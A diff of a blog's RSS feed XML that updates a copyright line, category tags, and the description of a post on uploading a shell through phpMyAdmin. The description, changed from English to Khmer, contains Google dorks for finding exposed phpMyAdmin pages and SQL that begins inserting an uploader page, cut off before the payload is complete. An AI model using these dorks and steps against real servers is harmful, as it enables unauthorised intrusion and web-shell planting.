@@ -13,7 +13,7 @@
     <language>en</language>
     <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
     <webMaster>thiklife403@gmail.com (Thik)</webMaster>
-    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2019 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
     <lastBuildDate>Thu, 01 Apr 2021 10:01:06 +0700</lastBuildDate>
     
         <atom:link href="https://thiklab.com/en/categories/sqli/index.xml" rel="self" type="application/rss+xml" />
@@ -27,10 +27,10 @@
         <author>thiklife403@gmail.com (Thik)</author>
         <atom:modified>Thu, 01 Apr 2021 10:01:06 +0700</atom:modified>
         <guid>https://thiklab.com/en/posts/upload-shell-via-phpmyadmin/</guid>
-        <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query Go to phpMyadmin database and create new database, ex: &amp;ldquo;uploader&amp;rdquo; and than select on SQL tap and paste this code below.
-1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   And this code.
-1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   Now select on table user_upload and SQL tap and paste this code below.
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(&amp;#39;&amp;lt;!</description>
+        <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query ចូលទៅកាន់ផ្ទាំង phpMyadmin database ហើយបង្កើត database ថ្មីមួយ ឧ, &amp;ldquo;uploader&amp;rdquo; បន្ទាប់មកចុចត្រង់ផ្ទាំង SQL ហើយចម្លងចូលនូវកូដខាងក្រោមនេះ៖
+1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   និងកូដខាងក្រោមនេះទៀត៖
+1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   បន្ទាប់មកចូលទៅកាន់ table ឈ្មោះថា user_upload ហើយចុចត្រង់ផ្ទាំង SQL និងចម្លងចូលនូវកូដខាងក្រោម៖
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(&amp;#39;&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta http-equiv=&amp;#34;Content-Type&amp;#34; content=&amp;#34;text/html; charset=utf-8&amp;#34; /&amp;gt; &amp;lt;title&amp;gt;Uploader&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body bgcolor=&amp;#34;black&amp;#34;&amp;gt; &amp;lt;center&amp;gt; &amp;lt;div style=&amp;#34;color:white;margin-top:150px;&amp;#34;&amp;gt;&amp;lt;h1&amp;gt;Uploader&amp;lt;/h1&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;div&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;form enctype=&amp;#34;multipart/form-data&amp;#34; action=&amp;#34;uploader.</description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://thiklab.comimages/feature3/sqli.png" medium="image"><media:title type="html">featured image</media:title></media:content>
@@ -39,11 +39,15 @@
         
           
             
-              <category>fileupload</category>
+              <category>file-upload</category>
             
           
             
-              <category>googledork</category>
+              <category>google-dork</category>
+            
+          
+            
+              <category>phpmyadmin</category>
             
           
         
